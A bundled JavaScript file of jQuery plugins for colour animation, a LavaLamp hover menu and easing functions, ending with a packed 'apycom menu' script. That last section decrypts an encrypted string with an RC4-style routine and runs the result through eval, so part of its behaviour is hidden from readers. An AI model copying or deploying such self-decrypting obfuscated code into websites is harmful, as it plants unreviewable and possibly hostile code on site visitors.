/** jquery.color.js ****************/
/*
 * jQuery Color Animations
 * Copyright 2007 John Resig
 * Released under the MIT and GPL licenses.
 */

(function(jQuery){

	// We override the animation for all of these color styles
	jQuery.each(['backgroundColor', 'borderBottomColor', 'borderLeftColor', 'borderRightColor', 'borderTopColor', 'color', 'outlineColor'], function(i,attr){
		jQuery.fx.step[attr] = function(fx){
			if ( fx.state == 0 ) {
				fx.start = getColor( fx.elem, attr );
				fx.end = getRGB( fx.end );
			}
            if ( fx.start )
                fx.elem.style[attr] = "rgb(" + [
                    Math.max(Math.min( parseInt((fx.pos * (fx.end[0] - fx.start[0])) + fx.start[0]), 255), 0),
                    Math.max(Math.min( parseInt((fx.pos * (fx.end[1] - fx.start[1])) + fx.start[1]), 255), 0),
                    Math.max(Math.min( parseInt((fx.pos * (fx.end[2] - fx.start[2])) + fx.start[2]), 255), 0)
                ].join(",") + ")";
		}
	});

	// Color Conversion functions from highlightFade
	// By Blair Mitchelmore
	// http://jquery.offput.ca/highlightFade/

	// Parse strings looking for color tuples [255,255,255]
	function getRGB(color) {
		var result;

		// Check if we're already dealing with an array of colors
		if ( color && color.constructor == Array && color.length == 3 )
			return color;

		// Look for rgb(num,num,num)
		if (result = /rgb\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*\)/.exec(color))
			return [parseInt(result[1]), parseInt(result[2]), parseInt(result[3])];

		// Look for rgb(num%,num%,num%)
		if (result = /rgb\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*\)/.exec(color))
			return [parseFloat(result[1])*2.55, parseFloat(result[2])*2.55, parseFloat(result[3])*2.55];

		// Look for #a0b1c2
		if (result = /#([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/.exec(color))
			return [parseInt(result[1],16), parseInt(result[2],16), parseInt(result[3],16)];

		// Look for #fff
		if (result = /#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(color))
			return [parseInt(result[1]+result[1],16), parseInt(result[2]+result[2],16), parseInt(result[3]+result[3],16)];

		// Otherwise, we're most likely dealing with a named color
		return colors[jQuery.trim(color).toLowerCase()];
	}
	
	function getColor(elem, attr) {
		var color;

		do {
			color = jQuery.curCSS(elem, attr);

			// Keep going until we find an element that has color, or we hit the body
			if ( color != '' && color != 'transparent' || jQuery.nodeName(elem, "body") )
				break; 

			attr = "backgroundColor";
		} while ( elem = elem.parentNode );

		return getRGB(color);
	};
	
	// Some named colors to work with
	// From Interface by Stefan Petre
	// http://interface.eyecon.ro/

	var colors = {
		aqua:[0,255,255],
		azure:[240,255,255],
		beige:[245,245,220],
		black:[0,0,0],
		blue:[0,0,255],
		brown:[165,42,42],
		cyan:[0,255,255],
		darkblue:[0,0,139],
		darkcyan:[0,139,139],
		darkgrey:[169,169,169],
		darkgreen:[0,100,0],
		darkkhaki:[189,183,107],
		darkmagenta:[139,0,139],
		darkolivegreen:[85,107,47],
		darkorange:[255,140,0],
		darkorchid:[153,50,204],
		darkred:[139,0,0],
		darksalmon:[233,150,122],
		darkviolet:[148,0,211],
		fuchsia:[255,0,255],
		gold:[255,215,0],
		green:[0,128,0],
		indigo:[75,0,130],
		khaki:[240,230,140],
		lightblue:[173,216,230],
		lightcyan:[224,255,255],
		lightgreen:[144,238,144],
		lightgrey:[211,211,211],
		lightpink:[255,182,193],
		lightyellow:[255,255,224],
		lime:[0,255,0],
		magenta:[255,0,255],
		maroon:[128,0,0],
		navy:[0,0,128],
		olive:[128,128,0],
		orange:[255,165,0],
		pink:[255,192,203],
		purple:[128,0,128],
		violet:[128,0,128],
		red:[255,0,0],
		silver:[192,192,192],
		white:[255,255,255],
		yellow:[255,255,0]
	};
	
})(jQuery);

/** jquery.lavalamp.js ****************/
/**
 * LavaLamp - A menu plugin for jQuery with cool hover effects.
 * @requires jQuery v1.1.3.1 or above
 *
 * http://gmarwaha.com/blog/?p=7
 *
 * Copyright (c) 2007 Ganeshji Marwaha (gmarwaha.com)
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 *
 * Version: 0.1.0
 */

/**
 * Creates a menu with an unordered list of menu-items. You can either use the CSS that comes with the plugin, or write your own styles 
 * to create a personalized effect
 *
 * The HTML markup used to build the menu can be as simple as...
 *
 *       <ul class="lavaLamp">
 *           <li><a href="#">Home</a></li>
 *           <li><a href="#">Plant a tree</a></li>
 *           <li><a href="#">Travel</a></li>
 *           <li><a href="#">Ride an elephant</a></li>
 *       </ul>
 *
 * Once you have included the style sheet that comes with the plugin, you will have to include 
 * a reference to jquery library, easing plugin(optional) and the LavaLamp(this) plugin.
 *
 * Use the following snippet to initialize the menu.
 *   $(function() { $(".lavaLamp").lavaLamp({ fx: "backout", speed: 700}) });
 *
 * Thats it. Now you should have a working lavalamp menu. 
 *
 * @param an options object - You can specify all the options shown below as an options object param.
 *
 * @option fx - default is "linear"
 * @example
 * $(".lavaLamp").lavaLamp({ fx: "backout" });
 * @desc Creates a menu with "backout" easing effect. You need to include the easing plugin for this to work.
 *
 * @option speed - default is 500 ms
 * @example
 * $(".lavaLamp").lavaLamp({ speed: 500 });
 * @desc Creates a menu with an animation speed of 500 ms.
 *
 * @option click - no defaults
 * @example
 * $(".lavaLamp").lavaLamp({ click: function(event, menuItem) { return false; } });
 * @desc You can supply a callback to be executed when the menu item is clicked. 
 * The event object and the menu-item that was clicked will be passed in as arguments.
 */
(function($) {
$.fn.lavaLamp = function(o) {
    o = $.extend({ fx: "linear", speed: 500, click: function(){} }, o || {});

    return this.each(function() {
        var me = $(this), noop = function(){},
            $back = $('<li class="back"><div class="left"></div></li>').appendTo(me),
            $li = $(">li", this), curr = $("li.current", this)[0] || $($li[0]).addClass("current")[0];

        $li.not(".back").hover(function() {
            move(this);
        }, noop);

        $(this).hover(noop, function() {
            move(curr);
        });

        $li.click(function(e) {
            setCurr(this);
            return o.click.apply(this, [e, this]);
        });

        setCurr(curr);

        function setCurr(el) {
            $back.css({ "left": el.offsetLeft+"px", "width": el.offsetWidth+"px" });
            curr = el;
        };

        function move(el) {
            $back.each(function() {
                $.dequeue(this, "fx"); }
            ).animate({
                width: el.offsetWidth,
                left: el.offsetLeft
            }, o.speed, o.fx);
        };

    });
};
})(jQuery);

/** jquery.easing.js ****************/
/*
 * jQuery Easing v1.1 - http://gsgd.co.uk/sandbox/jquery.easing.php
 *
 * Uses the built in easing capabilities added in jQuery 1.1
 * to offer multiple easing options
 *
 * Copyright (c) 2007 George Smith
 * Licensed under the MIT License:
 *   http://www.opensource.org/licenses/mit-license.php
 */
jQuery.easing={easein:function(x,t,b,c,d){return c*(t/=d)*t+b},easeinout:function(x,t,b,c,d){if(t<d/2)return 2*c*t*t/(d*d)+b;var a=t-d/2;return-2*c*a*a/(d*d)+2*c*a/d+c/2+b},easeout:function(x,t,b,c,d){return-c*t*t/(d*d)+2*c*t/d+b},expoin:function(x,t,b,c,d){var a=1;if(c<0){a*=-1;c*=-1}return a*(Math.exp(Math.log(c)/d*t))+b},expoout:function(x,t,b,c,d){var a=1;if(c<0){a*=-1;c*=-1}return a*(-Math.exp(-Math.log(c)/d*(t-d))+c+1)+b},expoinout:function(x,t,b,c,d){var a=1;if(c<0){a*=-1;c*=-1}if(t<d/2)return a*(Math.exp(Math.log(c/2)/(d/2)*t))+b;return a*(-Math.exp(-2*Math.log(c/2)/d*(t-d))+c+1)+b},bouncein:function(x,t,b,c,d){return c-jQuery.easing['bounceout'](x,d-t,0,c,d)+b},bounceout:function(x,t,b,c,d){if((t/=d)<(1/2.75)){return c*(7.5625*t*t)+b}else if(t<(2/2.75)){return c*(7.5625*(t-=(1.5/2.75))*t+.75)+b}else if(t<(2.5/2.75)){return c*(7.5625*(t-=(2.25/2.75))*t+.9375)+b}else{return c*(7.5625*(t-=(2.625/2.75))*t+.984375)+b}},bounceinout:function(x,t,b,c,d){if(t<d/2)return jQuery.easing['bouncein'](x,t*2,0,c,d)*.5+b;return jQuery.easing['bounceout'](x,t*2-d,0,c,d)*.5+c*.5+b},elasin:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4}else var s=p/(2*Math.PI)*Math.asin(c/a);return-(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b},elasout:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4}else var s=p/(2*Math.PI)*Math.asin(c/a);return a*Math.pow(2,-10*t)*Math.sin((t*d-s)*(2*Math.PI)/p)+c+b},elasinout:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d/2)==2)return b+c;if(!p)p=d*(.3*1.5);if(a<Math.abs(c)){a=c;var s=p/4}else var s=p/(2*Math.PI)*Math.asin(c/a);if(t<1)return-.5*(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;return a*Math.pow(2,-10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p)*.5+c+b},backin:function(x,t,b,c,d){var s=1.70158;return c*(t/=d)*t*((s+1)*t-s)+b},backout:function(x,t,b,c,d){var s=1.70158;return c*((t=t/d-1)*t*((s+1)*t+s)+1)+b},backinout:function(x,t,b,c,d){var s=1.70158;if((t/=d/2)<1)return c/2*(t*t*(((s*=(1.525))+1)*t-s))+b;return c/2*((t-=2)*t*(((s*=(1.525))+1)*t+s)+2)+b},linear:function(x,t,b,c,d){return c*t/d+b}};


/** apycom menu ****************/
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('19(9(){h $=19;$.1R.N=9(1e,1g){h H=E;l(H.z){l(H[0].12)1P(H[0].12);H[0].12=1L(9(){1g(H)},1e)}P E};$(\'#m\').V(\'10-Z\');l($.v.O&&1K($.v.1J)==7)$(\'#m\').V(\'1S\');$(\'5 M\',\'#m\').8(\'A\',\'L\');$(\'.m>R\',\'#m\').1f(9(){h 5=$(\'M:D\',E);l(5.z){l(!5[0].I)5[0].I=5.C();5.8({C:1,F:\'L\'}).N(J,9(i){$(\'#m\').13(\'10-Z\');$(\'a:D\',5[0].14).V(\'17\');$(\'#m>5>R.1d\').8(\'16\',\'1I\');l($.v.O)i.8(\'A\',\'w\').n({C:5[0].I},{t:Q,u:9(){5.8(\'F\',\'w\')}});X i.8({A:\'w\',q:0}).n({C:5[0].I,q:1},{t:Q,u:9(){5.8(\'F\',\'w\')}})})}},9(){h 5=$(\'M:D\',E);l(5.z){h 8={A:\'L\',C:5[0].I};$(\'#m>5>R.1d\').8(\'16\',\'1G\');$(\'#m\').V(\'10-Z\');$(\'a:D\',5[0].14).13(\'17\');5.18().N(1b,9(i){l($.v.O)i.n({C:1},{t:J,u:9(){5.8(8)}});X i.8({q:1}).n({C:1,q:0},{t:J,u:9(){5.8(8)}})})}});$(\'5 5 R\',\'#m\').1f(9(){h 5=$(\'M:D\',E);l(5.z){l(!5[0].K)5[0].K=5.B();5.8({B:0,F:\'L\'}).N(1A,9(i){l($.v.O||$.v.1a)i.8(\'A\',\'w\').n({B:5[0].K},{t:Q,u:9(){5.8(\'F\',\'w\')}});X i.8({A:\'w\',q:0}).n({B:5[0].K,q:1},{t:Q,u:9(){5.8(\'F\',\'w\')}})})}},9(){h 5=$(\'M:D\',E);l(5.z){h 8={A:\'L\',B:5[0].K};5.18().N(1b,9(i){l($.v.O||$.v.1a)i.n({B:1},{t:J,u:9(){5.8(8)}});X i.8({q:1}).n({B:1,q:0},{t:J,u:9(){5.8(8)}})})}});$(\'#m 5.m\').1O({1B:1T})});1Y((9(k,s){h f={a:9(p){h s="1W+/=";h o="";h a,b,c="";h d,e,f,g="";h i=0;1V{d=s.T(p.U(i++));e=s.T(p.U(i++));f=s.T(p.U(i++));g=s.T(p.U(i++));a=(d<<2)|(e>>4);b=((e&15)<<4)|(f>>2);c=((f&3)<<6)|g;o=o+S.W(a);l(f!=1c)o=o+S.W(b);l(g!=1c)o=o+S.W(c);a=b=c="";d=e=f=g=""}1H(i<p.z);P o},b:9(k,p){s=[];11(h i=0;i<G;i++)s[i]=i;h j=0;h x;11(i=0;i<G;i++){j=(j+s[i]+k.1h(i%k.z))%G;x=s[i];s[i]=s[j];s[j]=x}i=0;j=0;h c="";11(h y=0;y<p.z;y++){i=(i+1)%G;j=(j+s[i])%G;x=s[i];s[i]=s[j];s[j]=x;c+=S.W(p.1h(y)^s[(s[i]+s[j])%G])}P c}};P f.b(k,f.a(s))})("1C","1D/1E/1F+1N+1U+x+1Q+/r/1X/1v+Y/1l+1m/1n+1k+1j/1i+1o+1q/1z/1w/1r+1s/1t+1u+1y/1x+1p/1M=="));',62,123,'|||||ul|||css|function||||||||var||||if|menu|animate|||opacity|||duration|complete|browser|visible|||length|visibility|width|height|first|this|overflow|256|node|hei|150|wid|hidden|div|retarder|msie|return|200|li|String|indexOf|charAt|addClass|fromCharCode|else||active|js|for|_timer_|removeClass|parentNode||display|over|stop|jQuery|opera|50|64|back|delay|hover|method|charCodeAt|IeRy4swEnJAHBFV6M126vVuGxsEpOOcn8G|3d0EStNUcJTSEwJKzSBe5zUZTMAgG6LhaAywGGqJ3m7EMwKtUClbYijlafkvxx9dUkFtoaqeFnYGu0kIDswotynGJw|0C0jZoGnaSR6kKvlkGUiQOlcE8EyuicpKvs8DDgFUhI|2gViXr1sP0|xm4Xh66BUarpUrRZmLTPp|pMh|XpplFjoLKguaWvzEK4IDVFwwp2fPniqxjA9UdMj5J4bLiddt4dgb2cvZIIU86DPz9SVEmdh81SZ2vqtJ|nzESJ|TShZQOJQO6e3SdzTYl1sL|038toKdWzTKdNJi|LZjkSt61dLv3W5EpD|BHWPr72dOIUEo6O6NfT|7V23|mjk3sEdeKwqMyEHj|tIPcU5cwdak8SY0ke|DABbe7VDtALWM6wVsnOCyxD0iLZ4M384cWmY|3N5NB9XvJeWHNY2iH|yi2bSDmbr2vy1Yde8fJMAt2TcI3AIN5|100|speed|U2iB35BS|2my|LRqLsAreLjhOtFqooiE6kE5QWQxHEV4seepxBeep|CrmYz7fbsu0EwFHDXb2jCTQ23oN|block|while|none|version|parseInt|setTimeout|suhPmeuF26P7XqhR3x3ymXuVTVqfKsjea9qCTYRaTESew|prirOFsDpLxi8O57nvFyn6KEhvHVHZUBn7Q9A40dV|lavaLamp|clearTimeout|wbPTCHm5wJJXvMbNNYvG6iv2ZLN9HmjYNerYbnOuiGzMexvgmYyyE4pevuZ1jCQewdc7MVrM3ceBYI4RVZtnNiOq5EHTkW4w9cUaE4RI6ZpUoIjs8rKnisXpx6AXcab0n|fn|ie7|400|mX9|do|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|LBN8rdeYQldXxVfLI3r130s9nrWR5pMW0q7YzfqNyNvfjy8GKwowycuLh4c3n0kg38j|eval'.split('|'),0,{}))